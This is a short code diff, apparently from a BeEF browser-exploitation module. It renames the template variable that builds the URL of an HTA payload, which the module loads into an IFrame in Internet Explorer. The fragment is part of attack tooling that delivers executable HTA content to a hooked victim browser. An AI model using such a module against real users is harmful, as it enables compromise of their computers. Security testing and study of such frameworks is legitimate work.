@@ -6,7 +6,7 @@
 
 beef.execute(function() {
 
-    var hta_url = '<%= @domain %>' + '<%= @mount_point %>';
+    var hta_url = '<%= @domain %>' + '<%= @hta_mount_point %>';
 
     if(beef.browser.isIE()){
         // application='yes' is IE-only and needed to load the HTA into an IFrame.
